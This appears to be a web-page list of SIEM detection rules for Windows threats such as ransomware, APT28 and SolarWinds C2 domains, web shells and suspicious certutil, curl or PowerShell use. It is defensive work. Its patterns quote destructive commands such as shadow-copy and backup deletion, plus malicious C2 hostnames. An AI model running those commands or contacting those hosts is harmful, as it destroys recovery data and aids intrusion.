<li><a href="#">rule sans_posterknown_normalfind_evil__sysmon_behaviour { meta: author = "Emir Erdogan" description = "SANS-Known normal Parent Child Processes.. Find Evil License: ." reference = "" version = "0.01" created = "2019/10/29" product = "windows" service = "sysmon" mitre = "T1502" events: (((((($selection1.metadata.product_event_type = "1" and (re.regex($selection1.target.process.file.full_path, `.*\\winlogon\.exe`) or re.regex($selection1.target.process.file.full_path, `.*\\wininit\.exe`) or re.regex($selection1.target.process.file.full_path, `.*\\csrss\.exe`))) and not (re.regex($selection1.src.process.file.full_path, `.*\\smss\.exe`))) or (($selection1.metadata.product_event_type = "1" and (re.regex($selection1.target.process.file.full_path, `.*\\tashost\.exe`) or re.regex($selection1.target.process.file.full_path, `.*\\svchost\.exe`))) and not (re.regex($selection1.src.process.file.full_path, `.*\\services\.exe`)))) or (($selection1.metadata.product_event_type = "1" and (re.regex($selection1.target.process.file.full_path, `.*\\lsass\.exe`) or re.regex($selection1.target.process.file.full_path, `.*\\lsm\.exe`) or re.regex($selection1.target.process.file.full_path, `.*\\services\.exe`) or re.regex($selection1.target.process.file.full_path, `.*\\lsaiso\.exe`))) and not (re.regex($selection1.src.process.file.full_path, `.*\\wininit\.exe`)))) or (($selection1.metadata.product_event_type = "1" and re.regex($selection1.target.process.file.full_path, `.*\\iexplore\.exe`)) and not (re.regex($selection1.src.process.file.full_path, `.*\\explorer\.exe`)))) or (($selection1.metadata.product_event_type = "1" and (re.regex($selection1.target.process.file.full_path, `.*\\RuntimeBroker\.exe`) or re.regex($selection1.target.process.file.full_path, `.*\\taskhostw\.exe`))) and not (re.regex($selection1.src.process.file.full_path, `.*\\svchost\.exe`)))) condition: $selection1 
<li><a href="#">rule sap_netweaver_application_server_as_java_cve20206287_detection { meta: author = "Furkan Celik" description = "It is a critical vulnerability in the LM Configuration Wizard component of the \"SAP NetWeaver Application Server (AS) Java\" platform, allowing unauthenticated users to run code. If it is successfully exploited, high authority users can be created, unlimited authority to SAP systems, commands can be run with SAP service user rights. License: ." reference = "" version = "0.01" created = "2020/07/16" product = "windows" service = "sysmon" mitre = "T1190, vulnerability_scanning, T1059, execution" events: ($selection.metadata.product_event_type = "1" and ($selection.metadata.description = "7.31" or $selection.metadata.description = "7.4" or $selection.metadata.description = "7.3" or $selection.metadata.description = "7.5") and $selection.metadata.product_name = "SAP NetWeaver") condition: $selection 
<li><a href="#">rule scanner_poc_for_cve20190708_rdp_rce_vuln { meta: author = "Florian Roth (rule), Adam Bradbury (idea)" description = "Detects the use of a scanner by zerosum0x0 that discovers targets vulnerable to CVE-2019-0708 RDP RCE aka BlueKeep License: ." reference = "" version = "0.01" created = "2019/06/02" product = "windows" service = "security" mitre = "lateral_movement, t1210, car.2013-07-002" events: ($selection.metadata.product_event_type = "4625" and $selection.src.user.user_display_name = "AAAAAAA") condition: $selection 
<li><a href="#">rule scarab_ransomware { meta: author = "Ariel Millahuel" description = "This new version of Scarab Ransomware was discovered by the investigator M. Shahpasandi License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "impact, T1486" events: ($selection1.metadata.product_event_type = "11" and (re.regex($selection1.target.file.full_path, `.*AppData\\Roaming\\svchoster\.exe.*`) or re.regex($selection1.target.file.full_path, `.*\.cov19.*`))) condition: $selection1 
<li><a href="#">rule scarab_ransomware_part_1 { meta: author = "Ariel Millahuel" description = "This new version of Scarab Ransomware was discovered by the investigator M. Shahpasandi License: ." reference = "" version = "0.01" created = "2021-03-09" category = "process_creation" product = "windows" mitre = "impact, T1486" events: ($selection2.target.process.command_line = "cmd.exe /c wbadmin DELETE SYSTEMSTATEBACKUP -keepVersions:0" and ($selection2.metadata.product_event_type = "4688" or $selection2.metadata.product_event_type = "1")) condition: $selection2 
<li><a href="#">rule scheduled_task_creation { meta: author = "Florian Roth" description = "Detects the creation of scheduled tasks in user session License: ." reference = "" version = "0.01" created = "2021-03-09" category = "process_creation" product = "windows" mitre = "execution, persistence, privilege_escalation, t1053, s0111" events: ((re.regex($selection.target.process.file.full_path, `.*\\schtasks\.exe`) and re.regex($selection.target.process.command_line, `.* /create .*`) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) and not ($selection.src.user.user_display_name = "NT AUTHORITY\\SYSTEM")) condition: $selection 
<li><a href="#">rule schtask_creation_sysmon { meta: author = "Michael Haag, Alexandr Yampolskyi" description = "Detects usage of schtask usage. License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "Execution, t1204" events: ($selection.metadata.product_event_type = "1" and $selection.target.process.file.full_path = "schtask.exe") condition: $selection 
<li><a href="#">rule schtask_from_user_profile_sysmon { meta: author = "Michael Haag, Alexandr Yampolskyi" description = "Detects usage of Powershell Download commands. License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "Execution, t1204, t1059" events: ($selection.metadata.product_event_type = "1" and (re.regex($selection.target.process.file.full_path, `.*schtask\.exe`) or re.regex($selection.target.process.file.full_path, `.*schtasks\.exe`)) and re.regex($selection.target.process.command_line, `.*\\appdata.*`)) condition: $selection 
<li><a href="#">rule secure_deletion_with_sdelete { meta: author = "Thomas Patzke" description = "Detects renaming of file while deletion with SDelete tool License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "security" mitre = "defense_evasion, t1107, t1066, s0195" events: (($selection.metadata.product_event_type = "4656" or $selection.metadata.product_event_type = "4663" or $selection.metadata.product_event_type = "4658") and ((re.regex($selection.target.registry.registry_value_data, `.*\.AAA`) or re.regex($selection.target.registry.registry_value_data, `.*\.ZZZ`)) or (re.regex($selection.target.file.full_path, `.*\.AAA`) or re.regex($selection.target.file.full_path, `.*\.ZZZ`)))) condition: $selection 
<li><a href="#">rule security_eventlog_cleared { meta: author = "Florian Roth" description = "Some threat groups tend to delete the local 'Security' Eventlog using certain utitlities License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "security" mitre = "defense_evasion, t1070" events: ($selection.metadata.product_event_type = "517" or $selection.metadata.product_event_type = "1102" or $selection.metadata.product_event_type = "104") condition: $selection 
<li><a href="#">rule sharprdp_execution { meta: author = "Den Iuzvyk" description = "Detects SharpRDP execution License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "t1076, lateral_movement" events: ($dllload.metadata.product_event_type = "7" and re.regex($dllload.target.process.file.full_path, `.*\\mstsc\.exe`) and re.regex($dllload.target.process.file.full_path, `.*\\mstscax\.dll`)) condition: $dllload 
<li><a href="#">rule shells_spawned_by_web_servers { meta: author = "Thomas Patzke" description = "Web servers that spawn shell processes could be the result of a successfully placed web shell or an other attack License: ." reference = "" version = "0.01" created = "2021-03-09" category = "process_creation" product = "windows" mitre = "privilege_escalation, persistence, t1100" events: ((re.regex($selection.src.process.file.full_path, `.*\\w3wp\.exe`) or re.regex($selection.src.process.file.full_path, `.*\\httpd\.exe`) or re.regex($selection.src.process.file.full_path, `.*\\nginx\.exe`) or re.regex($selection.src.process.file.full_path, `.*\\php-cgi\.exe`)) and (re.regex($selection.target.process.file.full_path, `.*\\cmd\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\sh\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\bash\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\powershell\.exe`)) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule signal_desktop_app_privilege_escalation { meta: author = "Halil Ibrahim Cosgun" description = "Detects Signal Desktop v1.29 app privilege escalation vulnerability. During the startup the application will execute the c:\\node_modules\\.bin\\wmic.exe binary if it exists. By default on Windows, low privileged users have the privilege to create folders under root level drives. License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "Execution, Defense_Evasion, Persistence, Privilege_Escalation, T1218, T1036, T1044" events: (($selection1.metadata.product_event_type = "1" and re.regex($selection1.src.process.file.full_path, `.*\\\\Signal\.exe`) and re.regex($selection1.target.process.command_line, `.*\\\\node_modules\\\\\.bin\\\\wmic\.exe`)) or ($selection1.metadata.product_event_type = "11" and re.regex($selection1.target.file.full_path, `.*\\\\node_modules\\\\\.bin\\\\wmic\.exe`))) condition: $selection1 
<li><a href="#">rule sigred_cve20201350_dns_remote_code_exploit_via_httpproxy_logs { meta: author = "SOC Prime Team" description = "Detects a possible exploitation of CVE-2020-1350 (aka SIGRED) using rare HTTP requests over port 53. HTTP should rarely (if ever) hosted on port 53. License: ." reference = "" version = "0.01" created = "2020/07/15" category = "proxy" mitre = "privilege_escalation, execution, t1068, t1190" events: ($port_53.target.port = "53" and not ((re.regex($port_53.src.application, `.*Firefox/.*`) or re.regex($port_53.src.application, `.*Chrome/.*`) or re.regex($port_53.src.application, `.*CrisOS/.*`) or re.regex($port_53.src.application, `.*OPR/.*`) or re.regex($port_53.src.application, `.*Safari/.*`) or re.regex($port_53.src.application, `.*Trident/.*`)))) condition: $port_53 
<li><a href="#">rule smbexecpy_service_installation { meta: author = "Omer Faruk Celik" description = "Detects the use of smbexec.py tool by detecting a specific service installation License: ." reference = "" version = "0.01" created = "2018/03/20" product = "windows" mitre = "lateral_movement, execution, t1077, t1035" events: ($service_installation.metadata.product_event_type = "7045" and $service_installation.target.process.command_line = "BTOBTO" and re.regex($service_installation.target.process.command_line, `.*\\execute\.bat`)) condition: $service_installation 
<li><a href="#">rule snatch_ransomware_sysmon_behaviour { meta: author = "Emir Erdogan" description = "Snatch ransomware reboots PCs into Safe Mode to bypass protection License: ." reference = "" version = "0.01" created = "2019/12/10" product = "windows" service = "sysmon" mitre = "T1486, T1022, T1313" events: (($selection1.target.process.command_line = "net stop SuperBackupMan" or $selection1.target.process.command_line = "vssadmin delete shadows /all /quiet" or $selection1.target.process.command_line = "sc start SuperBackupMan" or $selection1.target.process.command_line = "bcdedit.exe /set {current} safeboot minimal" or $selection1.target.process.command_line = "shutdown /r /f /t 00") or ($selection1.metadata.product_event_type = "11" and (re.regex($selection1.target.file.full_path, `.*\.snatch.*`) or re.regex($selection1.target.file.full_path, `.*\.jimm.*`) or re.regex($selection1.target.file.full_path, `.*\.googl.*`) or re.regex($selection1.target.file.full_path, `.*\.dglnl.*`) or re.regex($selection1.target.file.full_path, `.*\.ohwqg.*`) or re.regex($selection1.target.file.full_path, `.*\.wvtr0.*`) or re.regex($selection1.target.file.full_path, `.*\.hceem.*`)))) condition: $selection1 
<li><a href="#">rule socks_malware_detector_sysmon_behavior_august_2019 { meta: author = "Lee Archinal" description = "This content detects characteristics of the Socks malware strain as reported by Talos License: ." reference = "" version = "0.01" created = "2019/08/17" product = "windows" service = "sysmon" mitre = "persistence, t1060" events: (($selection1.metadata.product_event_type = "13" and ((($selection1.target.registry.registry_key = "HKCU\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN" and ($selection1.metadata.description = "ntuser" or $selection1.metadata.description = "autoload")) or ($selection1.target.registry.registry_key = "HKLM\\SYSTEM\\CONTROLSET001\\SERVICES\\SCHEDULE" and $selection1.metadata.description = "ImagePath")) or ($selection1.target.registry.registry_key = "HKLM\\SOFTWARE\\WOW6432NODE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN" and ($selection1.metadata.description = "ntuser" or $selection1.metadata.description = "autoload")))) or ($selection1.metadata.product_event_type = "11" and ($selection1.target.file.full_path = "C:\\Windows\\SysWOW64\\drivers\\spools.exe" or $selection1.target.file.full_path = "C:\\cftmon.exe"))) condition: $selection1 
<li><a href="#">rule sodinokibi_ransomware_detector_sysmon_behaviorjuly_2019 { meta: author = "Lee Archinal" description = "This detects characteristics of a sodinokibi strain identified in July 2019 License: ." reference = "" version = "0.01" created = "2019/07/29" product = "windows" service = "sysmon" mitre = "impact, t1486, execution, t1204" events: ($selection1.metadata.product_event_type = "11" and re.regex($selection1.target.file.full_path, `.*-readme\.txt`) and $selection1.metadata.product_event_type = "1" and $selection1.target.process.file.full_path = "C:\\Windows\\System32\\cmd.exe" and re.regex($selection1.target.process.command_line, `/c vssadmin\.exe Delete Shadows /All /Quiet & bcdedit /set .* recoveryenabled No & bcdedit /set .* bootstatuspolicy ignoreallfailures`)) condition: $selection1 
<li><a href="#">rule sofacy__apt_c2_domain_communication { meta: author = "Alexandr Yampolskyi, SOC Prime" description = "Sofacy, Fancy Bear, Pawn Storm, APT-28 domain communication detection. License: ." reference = "" version = "0.01" created = "2017/11/07" product = "proxy" mitre = "Command and Control, t1071, t1043" events: ($selection.target.hostname = "myinvestgroup.com" or $selection.target.hostname = "netmediaresources.com" or $selection.target.hostname = "webviewres.net" or $selection.target.hostname = "adfs.senate.group" or $selection.target.hostname = "adfs-senate.email" or $selection.target.hostname = "adfs-senate.services" or $selection.target.hostname = "adfs.senate.qov.info" or $selection.target.hostname = "chmail.ir.udelivered.tk" or $selection.target.hostname = "webmail-ibsf.org" or $selection.target.hostname = "fil-luge.com" or $selection.target.hostname = "biathlovvorld.com" or $selection.target.hostname = "mail-ibu.eu" or $selection.target.hostname = "fisski.ca" or $selection.target.hostname = "iihf.eu" or $selection.target.hostname = "Cdnverify.net" or $selection.target.hostname = "osce-press.com" or $selection.target.hostname = "electronicfrontierfoundation.org" or $selection.target.hostname = "baltichost.org" or $selection.target.hostname = "checkmalware.org" or $selection.target.hostname = "kavkazcentr.info" or $selection.target.hostname = "login-osce.org" or $selection.target.hostname = "malwarecheck.info" or $selection.target.hostname = "n0vinite.com" or $selection.target.hostname = "nato.nshq.in" or $selection.target.hostname = "natoexhibitionff14.com" or $selection.target.hostname = "novinitie.com" or $selection.target.hostname = "poczta.mon.q0v.pl" or $selection.target.hostname = "q0v.pl" or $selection.target.hostname = "qov.hu.com" or $selection.target.hostname = "rnil.am" or $selection.target.hostname = "scanmalware.info" or $selection.target.hostname = "smigroup-online.co.uk" or $selection.target.hostname = "standartnevvs.com" or $selection.target.hostname = "updatecenter.name" or $selection.target.hostname = "securitypractic.com" or $selection.target.hostname = "drivers-update.info" or $selection.target.hostname = "nato-press.com") condition: $selection 
<li><a href="#">rule solarwinds_backdoor_c2_host_name_detected_via_dns { meta: author = "SOC Prime Team, Fireeye" description = "This rule was converted from the FireEye hxioc DNS rules. This rule identifies the Sunburst C2 channel used in the compromise. License: ." reference = "" version = "0.01" created = "2021-03-09" category = "dns" mitre = "command_and_control, t1071.001" events: (re.regex($selection.network.dns.questions.name, `.*avsvmcloud\.com`) or re.regex($selection.network.dns.questions.name, `.*databasegalore\.com`) or re.regex($selection.network.dns.questions.name, `.*deftsecurity\.com`) or re.regex($selection.network.dns.questions.name, `.*freescanonline\.com`) or re.regex($selection.network.dns.questions.name, `.*panhardware\.com`) or re.regex($selection.network.dns.questions.name, `.*thedoccloud\.com`) or re.regex($selection.network.dns.questions.name, `.*incomeupdate\.com`) or re.regex($selection.network.dns.questions.name, `.*zupertech\.com`) or re.regex($selection.network.dns.questions.name, `.*digitalcollege\.org`) or re.regex($selection.network.dns.questions.name, `.*virtualdataserver\.com`)) condition: $selection 
<li><a href="#">rule solarwinds_backdoor_c2_host_name_detected_via_proxy { meta: author = "SOC Prime Team, Fireeye" description = "This rule was converted from the FireEye hxioc DNS rules. This rule identifies the Sunburst C2 channel used in the compromise. License: ." reference = "" version = "0.01" created = "2021-03-09" category = "proxy" mitre = "command_and_control, ta0011.001" events: (re.regex($selection.target.hostname, `.*avsvmcloud\.com`) or re.regex($selection.target.hostname, `.*databasegalore\.com`) or re.regex($selection.target.hostname, `.*deftsecurity\.com`) or re.regex($selection.target.hostname, `.*freescanonline\.com`) or re.regex($selection.target.hostname, `.*panhardware\.com`) or re.regex($selection.target.hostname, `.*thedoccloud\.com`) or re.regex($selection.target.hostname, `.*incomeupdate\.com`) or re.regex($selection.target.hostname, `.*zupertech\.com`) or re.regex($selection.target.hostname, `.*digitalcollege\.org`) or re.regex($selection.target.hostname, `.*virtualdataserver\.com`) or re.regex($selection.target.hostname, `.*lcomputers\.com`) or re.regex($selection.target.hostname, `.*webcodez\.com`)) condition: $selection 
<li><a href="#">rule spear_phishing_attack_on_gov_in_poland_apt28_sysmon { meta: author = "Alexandr Yampolskyi, SOC Prime" description = "Detector. License: ." reference = "" version = "0.01" created = "2018/11/17" product = "windows" service = "sysmon" mitre = "Execution, t1204, Persistence, t1060" events: (($selectionHash.metadata.product_event_type = "1" and ($selectionHash.target.file.md5 = "D7BC8E19721FDD0EEA29DE2B0F17504C7C2F62AD" or $selectionHash.target.file.md5 = "8FB0124DEF0E5A7A12495EDE2A20A9C48A7929A6" or $selectionHash.target.file.md5 = "D14A360FFA7645693EE6E19BC2B64CF7707504C8" or $selectionHash.target.file.md5 = "777DB69F7C22F6481FD2246A0FE444D410281270")) or ($selectionHash.metadata.product_event_type = "13" and re.regex($selectionHash.target.registry.registry_key, `.*\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\AudioMgr`))) condition: $selectionHash 
<li><a href="#">rule sticky_key_like_backdoor_usage { meta: author = "Florian Roth, @twjackomo" description = "Detects the usage and installation of a backdoor that uses an option to register a malicious debugger for built-in tools that are accessible in the login screen License: ." reference = "" version = "0.01" created = "2018/03/15" product = "windows" service = "sysmon" mitre = "privilege_escalation, persistence, t1015" events: (($selection_process.metadata.product_event_type = "1" and re.regex($selection_process.src.process.file.full_path, `.*\\winlogon\.exe`) and (re.regex($selection_process.target.process.command_line, `.*\\cmd\.exe sethc\.exe .*`) or re.regex($selection_process.target.process.command_line, `.*\\cmd\.exe utilman\.exe .*`) or re.regex($selection_process.target.process.command_line, `.*\\cmd\.exe osk\.exe .*`) or re.regex($selection_process.target.process.command_line, `.*\\cmd\.exe Magnify\.exe .*`) or re.regex($selection_process.target.process.command_line, `.*\\cmd\.exe Narrator\.exe .*`) or re.regex($selection_process.target.process.command_line, `.*\\cmd\.exe DisplaySwitch\.exe .*`))) or ($selection_process.metadata.product_event_type = "13" and (re.regex($selection_process.target.registry.registry_key, `.*\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc\.exe\\Debugger`) or re.regex($selection_process.target.registry.registry_key, `.*\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman\.exe\\Debugger`) or re.regex($selection_process.target.registry.registry_key, `.*\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\osk\.exe\\Debugger`) or re.regex($selection_process.target.registry.registry_key, `.*\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Magnify\.exe\\Debugger`) or re.regex($selection_process.target.registry.registry_key, `.*\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Narrator\.exe\\Debugger`) or re.regex($selection_process.target.registry.registry_key, `.*\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\DisplaySwitch\.exe\\Debugger`)) and $selection_process.metadata.event_type = "SetValue")) condition: $selection_process 
<li><a href="#">rule stop_ransomware_and_vidar_ransomware_detection { meta: author = "Ariel Millahuel" description = "This rule detects the behavior of a combination between STOP Ransomware and Vidar Ransomware. Both threats are used in combination in order to steal information after a phishing attack was succesfully executed License: ." reference = "" version = "0.01" created = "2021-03-09" category = "process_creation" product = "windows" mitre = "execution, T1059" events: (($selection1.metadata.product_event_type = "4688" or $selection1.metadata.product_event_type = "1") and (($selection1.target.process.file.full_path = "cmd.exe" and (re.regex($selection1.target.process.command_line, `/c taskkill /im 5\.exe /f & erase C:\\Users.*\\AppData\\Local\\Temp.*\\5\.exe & exit`) or re.regex($selection1.target.process.command_line, `/c taskkill /im .*\.exe /f & erase C:\\Users.*\\AppData\\Local\\Temp.*.*\.exe & exit`))) or ($selection1.target.process.file.full_path = "icacls.exe" and re.regex($selection1.target.process.command_line, `icacls C:\\Users.*\\AppData\\Local.*\\deny .*S-1-1-0:\(Ol\)\(Cl\)\(DE,DC\)`)))) condition: $selection1 
<li><a href="#">rule strike_network_inventory_explorer__unquoted_service_path { meta: author = "Osman Demir" description = "Detects 10-Strike Network Inventory Explorer for Windows Unquoted Search Path explotation License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "persistence, privilege_escalation, T1034" events: (($selection1.metadata.product_event_type = "1" and ($selection1.target.process.file.full_path = "C:\\InventoryWebServer.exe" or $selection1.target.process.file.full_path = "C:\\Program Files\\InventoryWebServer.exe")) or ($selection1.metadata.product_event_type = "11" and ($selection1.target.file.full_path = "C:\\InventoryWebServer.exe" or $selection1.target.file.full_path = "C:\\Program Files\\InventoryWebServer.exe"))) condition: $selection1 
<li><a href="#">rule suspicious_calculator_usage { meta: author = "Florian Roth" description = "Detects suspicious use of calc.exe with command line parameters or in a suspicious directory, which is likely caused by some PoC or detection evasion License: ." reference = "" version = "0.01" created = "2019/02/09" category = "process_creation" product = "windows" mitre = "defense_evasion, t1036" events: ((re.regex($selection1.target.process.command_line, `.*\\calc\.exe .*`) and ($selection1.metadata.product_event_type = "4688" or $selection1.metadata.product_event_type = "1")) or ((re.regex($selection1.target.process.file.full_path, `.*\\calc\.exe`) and ($selection1.metadata.product_event_type = "4688" or $selection1.metadata.product_event_type = "1")) and not (re.regex($selection1.target.process.file.full_path, `.*\\Windows\\Sys.*`)))) condition: $selection1 
<li><a href="#">rule suspicious_certutil_command { meta: author = "Florian Roth, juju4, keepwatch" description = "Detects a suspicious Microsoft certutil execution with sub commands like 'decode' sub command, which is sometimes used to decode malicious code with the built-in certutil utility License: ." reference = "" version = "0.01" created = "2021-03-09" category = "process_creation" product = "windows" mitre = "defense_evasion, t1140, t1105, s0189, g0007" events: ((re.regex($selection.target.process.command_line, `.* -decode .*`) or re.regex($selection.target.process.command_line, `.* /decode .*`) or re.regex($selection.target.process.command_line, `.* -decodehex .*`) or re.regex($selection.target.process.command_line, `.* /decodehex .*`) or re.regex($selection.target.process.command_line, `.* -urlcache .*`) or re.regex($selection.target.process.command_line, `.* /urlcache .*`) or re.regex($selection.target.process.command_line, `.* -verifyctl .*`) or re.regex($selection.target.process.command_line, `.* /verifyctl .*`) or re.regex($selection.target.process.command_line, `.* -encode .*`) or re.regex($selection.target.process.command_line, `.* /encode .*`) or re.regex($selection.target.process.command_line, `.*certutil.* -URL.*`) or re.regex($selection.target.process.command_line, `.*certutil.* /URL.*`) or re.regex($selection.target.process.command_line, `.*certutil.* -ping.*`) or re.regex($selection.target.process.command_line, `.*certutil.* /ping.*`)) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule suspicious_command_execution { meta: author = "Den Iuzvyk" description = "Detects suspicious command execution License: ." reference = "" version = "0.01" created = "2021-03-09" category = "process_creation" product = "windows" mitre = "execution, t1204, t1059" events: (re.regex($selection.target.process.file.full_path, `.*\\cmd\.exe`) and re.regex($selection.target.process.command_line, `.*rd.*`) and re.regex($selection.target.process.command_line, `.*/s.*`) and re.regex($selection.target.process.command_line, `.*/q.*`) and re.regex($selection.target.process.command_line, `.*timeout.*`) and re.regex($selection.target.process.command_line, `.* del .*`) and re.regex($selection.target.process.command_line, `.*\.exe.*`) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule suspicious_command_line_contains_azure_tokencachedat_as_argument_via_cmdline { meta: author = "SOC Prime Team" description = "TokenCache.dat is a clear-text JSON file containing the AccessKey for the current Azure session. License: ." reference = "" version = "0.01" created = "2021-03-09" category = "process_creation" product = "windows" mitre = "credential_access, lateral_movement, defense_evasion, t1003, t1528, t1527" events: (re.regex($selection.target.process.command_line, `.*TokenCache\.dat.*`) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule suspicious_commandline_escape { meta: author = "juju4" description = "Detects suspicious process that use escape characters License: ." reference = "" version = "0.01" created = "2021-03-09" category = "process_creation" product = "windows" mitre = "defense_evasion, t1140" events: (($selection.target.process.command_line = "^h^t^t^p" or $selection.target.process.command_line = "h\"t\"t\"p") and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule suspicious_compression_tool_parameters { meta: author = "Florian Roth, Samir Bousseaden" description = "Detects suspicious command line arguments of common data compression tools License: ." reference = "" version = "0.01" created = "2019/10/15" category = "process_creation" product = "windows" mitre = "collection, t1560.001, exfiltration, t1020, t1002" events: (((re.regex($falsepositive.target.process.command_line, `.* -p.*`) or re.regex($falsepositive.target.process.command_line, `.* -ta.*`) or re.regex($falsepositive.target.process.command_line, `.* -tb.*`) or re.regex($falsepositive.target.process.command_line, `.* -sdel.*`) or re.regex($falsepositive.target.process.command_line, `.* -dw.*`) or re.regex($falsepositive.target.process.command_line, `.* -hp.*`)) and (re.regex($falsepositive.target.file.full_path, `7z.*\.exe`) or re.regex($falsepositive.target.file.full_path, `.*rar\.exe`) or re.regex($falsepositive.target.file.full_path, `.*Command.*Line.*RAR.*`)) and ($falsepositive.metadata.product_event_type = "4688" or $falsepositive.metadata.product_event_type = "1")) and not (re.regex($falsepositive.src.process.file.full_path, `C:\\Program.*`))) condition: $falsepositive 
<li><a href="#">rule suspicious_curl_usage { meta: author = "Emir Erdogan" description = "cURL is a command line browser, and often used by attackers to download malware. License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "T1059, T1188, T1079, T1041" events: ($selection.target.process.file.full_path = "C:\\Windows\\System32\\curl.exe" and $selection.src.process.file.full_path = "C:\\Windows\\System32\\cmd.exe" and (re.regex($selection.target.process.command_line, `.*curl ftp.*`) or re.regex($selection.target.process.command_line, `.*curl --socks5 torproxy.*`) or re.regex($selection.target.process.command_line, `.*curl -F .*\.exe.*`) or re.regex($selection.target.process.command_line, `.*curl --dns-ipv4-addr.*`) or re.regex($selection.target.process.command_line, `.*curl --dns-interface eth1.*`) or re.regex($selection.target.process.command_line, `.*curl --resolve.*`) or re.regex($selection.target.process.command_line, `.*curl --header \"X-Application: BotClient\".*`))) condition: $selection 
<li><a href="#">rule suspicious_dns_query_with_b64_encoded_string { meta: author = "Florian Roth" description = "Detects suspicious DNS queries using base64 encoding License: ." reference = "" version = "0.01" created = "2018/05/10" category = "dns" events: re.regex($selection.target.url, `.*==\..*`) condition: $selection 
<li><a href="#">rule suspicious_double_extension { meta: author = "Florian Roth (rule), @blu3_team (idea)" description = "Detects suspicious use of an .exe extension after a non-executable file extension like .pdf.exe, a set of spaces or underlines to cloak the executable file in spear phishing campaigns License: ." reference = "" version = "0.01" created = "2019/06/26" category = "process_creation" product = "windows" mitre = "initial_access, t1193" events: ((re.regex($selection.target.process.file.full_path, `.*\.doc\.exe`) or re.regex($selection.target.process.file.full_path, `.*\.docx\.exe`) or re.regex($selection.target.process.file.full_path, `.*\.xls\.exe`) or re.regex($selection.target.process.file.full_path, `.*\.xlsx\.exe`) or re.regex($selection.target.process.file.full_path, `.*\.ppt\.exe`) or re.regex($selection.target.process.file.full_path, `.*\.pptx\.exe`) or re.regex($selection.target.process.file.full_path, `.*\.rtf\.exe`) or re.regex($selection.target.process.file.full_path, `.*\.pdf\.exe`) or re.regex($selection.target.process.file.full_path, `.*\.txt\.exe`) or re.regex($selection.target.process.file.full_path, `.* \.exe`) or re.regex($selection.target.process.file.full_path, `.*______\.exe`)) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule suspicious_driver_load_from_temp { meta: author = "Florian Roth" description = "Detects a driver load from a temporary directory License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "persistence, t1050" events: ($selection.metadata.product_event_type = "6" and re.regex($selection.target.process.file.full_path, `.*\\Temp\\.*`)) condition: $selection 
<li><a href="#">rule suspicious_encoded_powershell_command_line { meta: author = "Florian Roth, Markus Neis" description = "Detects suspicious powershell process starts with base64 encoded commands License: ." reference = "" version = "0.01" created = "2018/09/03" category = "process_creation" product = "windows" mitre = "execution, t1086" events: (((re.regex($selection.target.process.command_line, `.* -e JAB.*`) or re.regex($selection.target.process.command_line, `.* -e JAB.*`) or re.regex($selection.target.process.command_line, `.* -e JAB.*`) or re.regex($selection.target.process.command_line, `.* -e JAB.*`) or re.regex($selection.target.process.command_line, `.* -e JAB.*`) or re.regex($selection.target.process.command_line, `.* -e JAB.*`) or re.regex($selection.target.process.command_line, `.* -enc JAB.*`) or re.regex($selection.target.process.command_line, `.* -enco JAB.*`) or re.regex($selection.target.process.command_line, `.* -encodedcommand JAB.*`) or re.regex($selection.target.process.command_line, `.* BA^J e-`) or re.regex($selection.target.process.command_line, `.* -e SUVYI.*`) or re.regex($selection.target.process.command_line, `.* -e aWV4I.*`) or re.regex($selection.target.process.command_line, `.* -e SQBFAFgA.*`) or re.regex($selection.target.process.command_line, `.* -e aQBlAHgA.*`) or re.regex($selection.target.process.command_line, `.* -enc SUVYI.*`) or re.regex($selection.target.process.command_line, `.* -enc aWV4I.*`) or re.regex($selection.target.process.command_line, `.* -enc SQBFAFgA.*`) or re.regex($selection.target.process.command_line, `.* -enc aQBlAHgA.*`)) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) and not (re.regex($selection.target.process.command_line, `.* -ExecutionPolicy remotesigned .*`))) condition: $selection 
